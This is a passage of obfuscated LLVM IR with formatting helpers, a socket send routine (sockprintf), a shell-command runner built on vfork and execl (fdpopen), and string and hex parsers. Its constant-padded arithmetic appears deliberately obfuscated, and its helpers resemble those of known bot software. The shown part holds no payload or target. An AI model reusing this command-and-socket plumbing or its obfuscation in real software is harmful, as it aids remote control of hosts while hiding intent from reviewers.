  ret i32 %115
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %33

; <label>:25:                                     ; preds = %7
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %26, align 1
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %27, align 1
  %28 = load i8**, i8*** %9, align 8
  %29 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %30 = load i32, i32* %13, align 4
  %31 = load i32, i32* %14, align 4
  %32 = call i32 @prints(i8** %28, i8* %29, i32 %30, i32 %31)
  store i32 %32, i32* %8, align 4
  br label %130

; <label>:33:                                     ; preds = %7
  %34 = load i32, i32* %12, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %48

; <label>:36:                                     ; preds = %33
  %37 = load i32, i32* %11, align 4
  %38 = icmp eq i32 %37, 10
  br i1 %38, label %39, label %48

; <label>:39:                                     ; preds = %36
  %40 = load i32, i32* %10, align 4
  %41 = icmp slt i32 %40, 0
  br i1 %41, label %42, label %48

; <label>:42:                                     ; preds = %39
  store i32 1, i32* %19, align 4
  %43 = load i32, i32* %10, align 4
  %44 = sub i32 0, -504259125
  %45 = sub i32 %44, %43
  %46 = add i32 %45, -504259125
  %47 = sub nsw i32 0, %43
  store i32 %46, i32* %21, align 4
  br label %48

; <label>:48:                                     ; preds = %42, %39, %36, %33
  %49 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %50 = getelementptr inbounds i8, i8* %49, i64 12
  %51 = getelementptr inbounds i8, i8* %50, i64 -1
  store i8* %51, i8** %17, align 8
  %52 = load i8*, i8** %17, align 8
  store i8 0, i8* %52, align 1
  br label %53

; <label>:53:                                     ; preds = %77, %48
  %54 = load i32, i32* %21, align 4
  %55 = icmp ne i32 %54, 0
  br i1 %55, label %56, label %89

; <label>:56:                                     ; preds = %53
  %57 = load i32, i32* %21, align 4
  %58 = load i32, i32* %11, align 4
  %59 = urem i32 %57, %58
  store i32 %59, i32* %18, align 4
  %60 = load i32, i32* %18, align 4
  %61 = icmp sge i32 %60, 10
  br i1 %61, label %62, label %77

; <label>:62:                                     ; preds = %56
  %63 = load i32, i32* %15, align 4
  %64 = add i32 %63, -229049127
  %65 = sub i32 %64, 48
  %66 = sub i32 %65, -229049127
  %67 = sub nsw i32 %63, 48
  %68 = sub i32 %66, 1989833111
  %69 = sub i32 %68, 10
  %70 = add i32 %69, 1989833111
  %71 = sub nsw i32 %66, 10
  %72 = load i32, i32* %18, align 4
  %73 = sub i32 %72, 100989732
  %74 = add i32 %73, %70
  %75 = add i32 %74, 100989732
  %76 = add nsw i32 %72, %70
  store i32 %75, i32* %18, align 4
  br label %77

; <label>:77:                                     ; preds = %62, %56
  %78 = load i32, i32* %18, align 4
  %79 = add i32 %78, 555517912
  %80 = add i32 %79, 48
  %81 = sub i32 %80, 555517912
  %82 = add nsw i32 %78, 48
  %83 = trunc i32 %81 to i8
  %84 = load i8*, i8** %17, align 8
  %85 = getelementptr inbounds i8, i8* %84, i32 -1
  store i8* %85, i8** %17, align 8
  store i8 %83, i8* %85, align 1
  %86 = load i32, i32* %11, align 4
  %87 = load i32, i32* %21, align 4
  %88 = udiv i32 %87, %86
  store i32 %88, i32* %21, align 4
  br label %53

; <label>:89:                                     ; preds = %53
  %90 = load i32, i32* %19, align 4
  %91 = icmp ne i32 %90, 0
  br i1 %91, label %92, label %119

; <label>:92:                                     ; preds = %89
  %93 = load i32, i32* %13, align 4
  %94 = icmp ne i32 %93, 0
  br i1 %94, label %95, label %115

; <label>:95:                                     ; preds = %92
  %96 = load i32, i32* %14, align 4
  %97 = xor i32 2, -1
  %98 = xor i32 %96, %97
  %99 = and i32 %98, %96
  %100 = and i32 %96, 2
  %101 = icmp ne i32 %99, 0
  br i1 %101, label %102, label %115

; <label>:102:                                    ; preds = %95
  %103 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %103, i32 45)
  %104 = load i32, i32* %20, align 4
  %105 = add i32 %104, 1379121426
  %106 = add i32 %105, 1
  %107 = sub i32 %106, 1379121426
  %108 = add nsw i32 %104, 1
  store i32 %107, i32* %20, align 4
  %109 = load i32, i32* %13, align 4
  %110 = sub i32 0, %109
  %111 = sub i32 0, -1
  %112 = add i32 %110, %111
  %113 = sub i32 0, %112
  %114 = add nsw i32 %109, -1
  store i32 %113, i32* %13, align 4
  br label %118

; <label>:115:                                    ; preds = %95, %92
  %116 = load i8*, i8** %17, align 8
  %117 = getelementptr inbounds i8, i8* %116, i32 -1
  store i8* %117, i8** %17, align 8
  store i8 45, i8* %117, align 1
  br label %118

; <label>:118:                                    ; preds = %115, %102
  br label %119

; <label>:119:                                    ; preds = %118, %89
  %120 = load i32, i32* %20, align 4
  %121 = load i8**, i8*** %9, align 8
  %122 = load i8*, i8** %17, align 8
  %123 = load i32, i32* %13, align 4
  %124 = load i32, i32* %14, align 4
  %125 = call i32 @prints(i8** %121, i8* %122, i32 %123, i32 %124)
  %126 = add i32 %120, -538273025
  %127 = add i32 %126, %125
  %128 = sub i32 %127, -538273025
  %129 = add nsw i32 %120, %125
  store i32 %128, i32* %8, align 4
  br label %130

; <label>:130:                                    ; preds = %119, %25
  %131 = load i32, i32* %8, align 4
  ret i32 %131
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  %6 = icmp ne i8** %5, null
  br i1 %6, label %7, label %15

; <label>:7:                                      ; preds = %2
  %8 = load i32, i32* %4, align 4
  %9 = trunc i32 %8 to i8
  %10 = load i8**, i8*** %3, align 8
  %11 = load i8*, i8** %10, align 8
  store i8 %9, i8* %11, align 1
  %12 = load i8**, i8*** %3, align 8
  %13 = load i8*, i8** %12, align 8
  %14 = getelementptr inbounds i8, i8* %13, i32 1
  store i8* %14, i8** %12, align 8
  br label %18

; <label>:15:                                     ; preds = %2
  %16 = bitcast i32* %4 to i8*
  %17 = call i64 @write(i32 1, i8* %16, i64 1)
  br label %18

; <label>:18:                                     ; preds = %15, %7
  ret void
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #2

declare i64 @write(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #2
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #10
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i8*, i8** %6, align 8
  %24 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.65, i32 0, i32 0), i8* %23)
  %25 = load i32, i32* %3, align 4
  %26 = load i8*, i8** %6, align 8
  %27 = load i8*, i8** %6, align 8
  %28 = call i64 @strlen(i8* %27) #10
  %29 = call i64 @send(i32 %25, i8* %26, i64 %28, i32 16384)
  %30 = trunc i64 %29 to i32
  store i32 %30, i32* %8, align 4
  %31 = load i8*, i8** %6, align 8
  call void @free(i8* %31) #2
  %32 = load i32, i32* %8, align 4
  ret i32 %32
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: nounwind
declare void @free(i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca [2 x i32], align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  %13 = icmp ne i32 %12, 114
  br i1 %13, label %14, label %19

; <label>:14:                                     ; preds = %2
  %15 = load i8*, i8** %5, align 8
  %16 = load i8, i8* %15, align 1
  %17 = zext i8 %16 to i32
  %18 = icmp ne i32 %17, 119
  br i1 %18, label %25, label %19

; <label>:19:                                     ; preds = %14, %2
  %20 = load i8*, i8** %5, align 8
  %21 = getelementptr inbounds i8, i8* %20, i64 1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 0
  br i1 %24, label %25, label %26

; <label>:25:                                     ; preds = %19, %14
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:26:                                     ; preds = %19
  %27 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i32 0, i32 0
  %28 = call i32 @pipe(i32* %27) #2
  %29 = icmp slt i32 %28, 0
  br i1 %29, label %30, label %31

; <label>:30:                                     ; preds = %26
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:31:                                     ; preds = %26
  %32 = load i32*, i32** @fdopen_pids, align 8
  %33 = icmp eq i32* %32, null
  br i1 %33, label %34, label %54

; <label>:34:                                     ; preds = %31
  %35 = call i32 @getdtablesize() #2
  store i32 %35, i32* %8, align 4
  %36 = icmp sle i32 %35, 0
  br i1 %36, label %37, label %38

; <label>:37:                                     ; preds = %34
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:38:                                     ; preds = %34
  %39 = load i32, i32* %8, align 4
  %40 = sext i32 %39 to i64
  %41 = mul i64 %40, 4
  %42 = trunc i64 %41 to i32
  %43 = zext i32 %42 to i64
  %44 = call noalias i8* @malloc(i64 %43) #2
  %45 = bitcast i8* %44 to i32*
  store i32* %45, i32** @fdopen_pids, align 8
  %46 = icmp eq i32* %45, null
  br i1 %46, label %47, label %48

; <label>:47:                                     ; preds = %38
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:48:                                     ; preds = %38
  %49 = load i32*, i32** @fdopen_pids, align 8
  %50 = bitcast i32* %49 to i8*
  %51 = load i32, i32* %8, align 4
  %52 = sext i32 %51 to i64
  %53 = mul i64 %52, 4
  call void @llvm.memset.p0i8.i64(i8* %50, i8 0, i64 %53, i32 1, i1 false)
  br label %54

; <label>:54:                                     ; preds = %48, %31
  %55 = call i32 @vfork() #11
  store i32 %55, i32* %9, align 4
  switch i32 %55, label %101 [
    i32 -1, label %56
    i32 0, label %63
  ]

; <label>:56:                                     ; preds = %54
  %57 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %58 = load i32, i32* %57, align 4
  %59 = call i32 @close(i32 %58)
  %60 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %61 = load i32, i32* %60, align 4
  %62 = call i32 @close(i32 %61)
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:63:                                     ; preds = %54
  %64 = load i8*, i8** %5, align 8
  %65 = load i8, i8* %64, align 1
  %66 = zext i8 %65 to i32
  %67 = icmp eq i32 %66, 114
  br i1 %67, label %68, label %83

; <label>:68:                                     ; preds = %63
  %69 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %70 = load i32, i32* %69, align 4
  %71 = icmp ne i32 %70, 1
  br i1 %71, label %72, label %79

; <label>:72:                                     ; preds = %68
  %73 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %74 = load i32, i32* %73, align 4
  %75 = call i32 @dup2(i32 %74, i32 1) #2
  %76 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %77 = load i32, i32* %76, align 4
  %78 = call i32 @close(i32 %77)
  br label %79

; <label>:79:                                     ; preds = %72, %68
  %80 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %81 = load i32, i32* %80, align 4
  %82 = call i32 @close(i32 %81)
  br label %98

; <label>:83:                                     ; preds = %63
  %84 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %85 = load i32, i32* %84, align 4
  %86 = icmp ne i32 %85, 0
  br i1 %86, label %87, label %94

; <label>:87:                                     ; preds = %83
  %88 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %89 = load i32, i32* %88, align 4
  %90 = call i32 @dup2(i32 %89, i32 0) #2
  %91 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %92 = load i32, i32* %91, align 4
  %93 = call i32 @close(i32 %92)
  br label %94

; <label>:94:                                     ; preds = %87, %83
  %95 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %96 = load i32, i32* %95, align 4
  %97 = call i32 @close(i32 %96)
  br label %98

; <label>:98:                                     ; preds = %94, %79
  %99 = load i8*, i8** %4, align 8
  %100 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.68, i32 0, i32 0), i8* %99, i8* null) #2
  call void @_exit(i32 127) #12
  unreachable

; <label>:101:                                    ; preds = %54
  %102 = load i8*, i8** %5, align 8
  %103 = load i8, i8* %102, align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 114
  br i1 %105, label %106, label %112

; <label>:106:                                    ; preds = %101
  %107 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %108 = load i32, i32* %107, align 4
  store i32 %108, i32* %6, align 4
  %109 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %110 = load i32, i32* %109, align 4
  %111 = call i32 @close(i32 %110)
  br label %118

; <label>:112:                                    ; preds = %101
  %113 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %114 = load i32, i32* %113, align 4
  store i32 %114, i32* %6, align 4
  %115 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %116 = load i32, i32* %115, align 4
  %117 = call i32 @close(i32 %116)
  br label %118

; <label>:118:                                    ; preds = %112, %106
  %119 = load i32, i32* %9, align 4
  %120 = load i32*, i32** @fdopen_pids, align 8
  %121 = load i32, i32* %6, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i32, i32* %120, i64 %122
  store i32 %119, i32* %123, align 4
  %124 = load i32, i32* %6, align 4
  store i32 %124, i32* %3, align 4
  br label %125

; <label>:125:                                    ; preds = %118, %56, %47, %37, %30, %25
  %126 = load i32, i32* %3, align 4
  ret i32 %126
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) #4

; Function Attrs: nounwind
declare i32 @getdtablesize() #4

; Function Attrs: nounwind returns_twice
declare i32 @vfork() #6

declare i32 @close(i32) #3

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) #4

; Function Attrs: nounwind
declare i32 @execl(i8*, i8*, ...) #4

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.in_addr, align 4
  store i32 %0, i32* %3, align 4
  %10 = load i32*, i32** @fdopen_pids, align 8
  %11 = icmp eq i32* %10, null
  br i1 %11, label %19, label %12

; <label>:12:                                     ; preds = %1
  %13 = load i32*, i32** @fdopen_pids, align 8
  %14 = load i32, i32* %3, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds i32, i32* %13, i64 %15
  %17 = load i32, i32* %16, align 4
  %18 = icmp eq i32 %17, 0
  br i1 %18, label %19, label %20

; <label>:19:                                     ; preds = %12, %1
  store i32 -1, i32* %2, align 4
  br label %65

; <label>:20:                                     ; preds = %12
  %21 = load i32, i32* %3, align 4
  %22 = call i32 @close(i32 %21)
  %23 = call i32 @sigemptyset(%struct.__sigset_t* %6) #2
  %24 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 2) #2
  %25 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 3) #2
  %26 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 1) #2
  %27 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %6, %struct.__sigset_t* %5) #2
  br label %28

; <label>:28:                                     ; preds = %42, %20
  %29 = load i32*, i32** @fdopen_pids, align 8
  %30 = load i32, i32* %3, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i32, i32* %29, i64 %31
  %33 = load i32, i32* %32, align 4
  %34 = call i32 @waitpid(i32 %33, i32* %7, i32 0)
  store i32 %34, i32* %8, align 4
  br label %35

; <label>:35:                                     ; preds = %28
  %36 = load i32, i32* %8, align 4
  %37 = icmp eq i32 %36, -1
  br i1 %37, label %38, label %42

; <label>:38:                                     ; preds = %35
  %39 = call i32* @__errno_location() #13
  %40 = load i32, i32* %39, align 4
  %41 = icmp eq i32 %40, 4
  br label %42

; <label>:42:                                     ; preds = %38, %35
  %43 = phi i1 [ false, %35 ], [ %41, %38 ]
  br i1 %43, label %28, label %44

; <label>:44:                                     ; preds = %42
  %45 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* %5, %struct.__sigset_t* null) #2
  %46 = load i32*, i32** @fdopen_pids, align 8
  %47 = load i32, i32* %4, align 4
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds i32, i32* %46, i64 %48
  store i32 0, i32* %49, align 4
  %50 = load i32, i32* %8, align 4
  %51 = icmp eq i32 %50, -1
  br i1 %51, label %52, label %53

; <label>:52:                                     ; preds = %44
  br label %63

; <label>:53:                                     ; preds = %44
  %54 = bitcast %struct.in_addr* %9 to i32*
  %55 = load i32, i32* %7, align 4
  store i32 %55, i32* %54, align 4
  %56 = bitcast %struct.in_addr* %9 to i32*
  %57 = load i32, i32* %56, align 4
  %58 = xor i32 65280, -1
  %59 = xor i32 %57, %58
  %60 = and i32 %59, %57
  %61 = and i32 %57, 65280
  %62 = ashr i32 %60, 8
  br label %63

; <label>:63:                                     ; preds = %53, %52
  %64 = phi i32 [ -1, %52 ], [ %62, %53 ]
  store i32 %64, i32* %2, align 4
  br label %65

; <label>:65:                                     ; preds = %63, %19
  %66 = load i32, i32* %2, align 4
  ret i32 %66
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) #4

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) #4

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) #4

declare i32 @waitpid(i32, i32*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #8

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 1, i32* %7, align 4
  store i32 0, i32* %8, align 4
  br label %9

; <label>:9:                                      ; preds = %27, %3
  %10 = load i32, i32* %7, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

; <label>:12:                                     ; preds = %9
  %13 = load i32, i32* %8, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

; <label>:16:                                     ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %8, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

; <label>:25:                                     ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %39

; <label>:27:                                     ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %8, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 %28, i8* %32, i64 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %7, align 4
  %35 = load i32, i32* %8, align 4
  %36 = sub i32 0, 1
  %37 = sub i32 %35, %36
  %38 = add nsw i32 %35, 1
  store i32 %37, i32* %8, align 4
  br label %9

; <label>:39:                                     ; preds = %25
  %40 = load i32, i32* %7, align 4
  %41 = icmp eq i32 %40, 0
  br i1 %41, label %42, label %43

; <label>:42:                                     ; preds = %39
  br label %45

; <label>:43:                                     ; preds = %39
  %44 = load i8*, i8** %4, align 8
  br label %45

; <label>:45:                                     ; preds = %43, %42
  %46 = phi i8* [ null, %42 ], [ %44, %43 ]
  ret i8* %46
}

declare i64 @read(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i64 @parseHex(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  store i8* %0, i8** %2, align 8
  store i64 0, i64* %3, align 8
  br label %4

; <label>:4:                                      ; preds = %14, %1
  %5 = load i8*, i8** %2, align 8
  %6 = load i8, i8* %5, align 1
  %7 = zext i8 %6 to i32
  %8 = icmp ne i32 %7, 0
  br i1 %8, label %9, label %12

; <label>:9:                                      ; preds = %4
  %10 = load i64, i64* %3, align 8
  %11 = icmp sge i64 %10, 0
  br label %12

; <label>:12:                                     ; preds = %9, %4
  %13 = phi i1 [ false, %4 ], [ %11, %9 ]
  br i1 %13, label %14, label %27

; <label>:14:                                     ; preds = %12
  %15 = load i64, i64* %3, align 8
  %16 = shl i64 %15, 4
  %17 = load i8*, i8** %2, align 8
  %18 = getelementptr inbounds i8, i8* %17, i32 1
  store i8* %18, i8** %2, align 8
  %19 = load i8, i8* %17, align 1
  %20 = zext i8 %19 to i64
  %21 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %20
  %22 = load i64, i64* %21, align 8
  %23 = and i64 %16, %22
  %24 = xor i64 %16, %22
  %25 = or i64 %23, %24
  %26 = or i64 %16, %22
  store i64 %25, i64* %3, align 8
  br label %4

; <label>:27:                                     ; preds = %12
  %28 = load i64, i64* %3, align 8
  ret i64 %28
}

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  switch i32 %8, label %94 [
    i32 0, label %9
    i32 42, label %13
    i32 63, label %57
  ]

; <label>:9:                                      ; preds = %2
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %3, align 4
  br label %131

; <label>:13:                                     ; preds = %2
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds i8, i8* %14, i64 1
  %16 = load i8*, i8** %5, align 8
  %17 = call i32 @wildString(i8* %15, i8* %16)
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %43

; <label>:19:                                     ; preds = %13
  %20 = load i8*, i8** %5, align 8
  %21 = load i8, i8* %20, align 1
  %22 = zext i8 %21 to i32
  %23 = icmp ne i32 %22, 0
  br i1 %23, label %24, label %41

; <label>:24:                                     ; preds = %19
  %25 = load i8*, i8** %4, align 8
  %26 = load i8*, i8** %5, align 8
  %27 = getelementptr inbounds i8, i8* %26, i64 1
  %28 = call i32 @wildString(i8* %25, i8* %27)
  %29 = icmp ne i32 %28, 0
  %30 = xor i1 %29, true
  %31 = and i1 true, %30
  %32 = xor i1 true, true
  %33 = and i1 %29, %32
  %34 = xor i1 true, true
  %35 = and i1 %34, true
  %36 = and i1 true, %32
  %37 = or i1 %31, %33
  %38 = or i1 %35, %36
  %39 = xor i1 %37, %38
  %40 = xor i1 %29, true
  br label %41

; <label>:41:                                     ; preds = %24, %19
  %42 = phi i1 [ false, %19 ], [ %39, %24 ]
  br label %43

; <label>:43:                                     ; preds = %41, %13
  %44 = phi i1 [ true, %13 ], [ %42, %41 ]
  %45 = xor i1 %44, true
  %46 = and i1 false, %45
  %47 = xor i1 false, true
  %48 = and i1 %44, %47
  %49 = xor i1 true, true
  %50 = and i1 %49, false
  %51 = and i1 true, %47
  %52 = or i1 %46, %48
  %53 = or i1 %50, %51
  %54 = xor i1 %52, %53
  %55 = xor i1 %44, true
  %56 = zext i1 %54 to i32
  store i32 %56, i32* %3, align 4
  br label %131

; <label>:57:                                     ; preds = %2
  %58 = load i8*, i8** %5, align 8
  %59 = load i8, i8* %58, align 1
  %60 = zext i8 %59 to i32
  %61 = icmp ne i32 %60, 0
  br i1 %61, label %62, label %80

; <label>:62:                                     ; preds = %57
  %63 = load i8*, i8** %4, align 8
  %64 = getelementptr inbounds i8, i8* %63, i64 1
  %65 = load i8*, i8** %5, align 8
  %66 = getelementptr inbounds i8, i8* %65, i64 1
  %67 = call i32 @wildString(i8* %64, i8* %66)
  %68 = icmp ne i32 %67, 0
  %69 = xor i1 %68, true
  %70 = and i1 true, %69
  %71 = xor i1 true, true
  %72 = and i1 %68, %71
  %73 = xor i1 true, true
  %74 = and i1 %73, true
  %75 = and i1 true, %71
  %76 = or i1 %70, %72
  %77 = or i1 %74, %75
  %78 = xor i1 %76, %77
  %79 = xor i1 %68, true
  br label %80

; <label>:80:                                     ; preds = %62, %57
  %81 = phi i1 [ false, %57 ], [ %78, %62 ]
  %82 = xor i1 %81, true
  %83 = and i1 false, %82
  %84 = xor i1 false, true
  %85 = and i1 %81, %84
  %86 = xor i1 true, true
  %87 = and i1 %86, false
  %88 = and i1 true, %84
  %89 = or i1 %83, %85
  %90 = or i1 %87, %88
  %91 = xor i1 %89, %90
  %92 = xor i1 %81, true
  %93 = zext i1 %91 to i32
  store i32 %93, i32* %3, align 4
  br label %131

; <label>:94:                                     ; preds = %2
  %95 = load i8*, i8** %4, align 8
  %96 = load i8, i8* %95, align 1
  %97 = zext i8 %96 to i32
  %98 = call i32 @toupper(i32 %97) #10
  %99 = load i8*, i8** %5, align 8
  %100 = load i8, i8* %99, align 1
  %101 = zext i8 %100 to i32
  %102 = call i32 @toupper(i32 %101) #10
  %103 = icmp eq i32 %98, %102
  br i1 %103, label %104, label %117

; <label>:104:                                    ; preds = %94
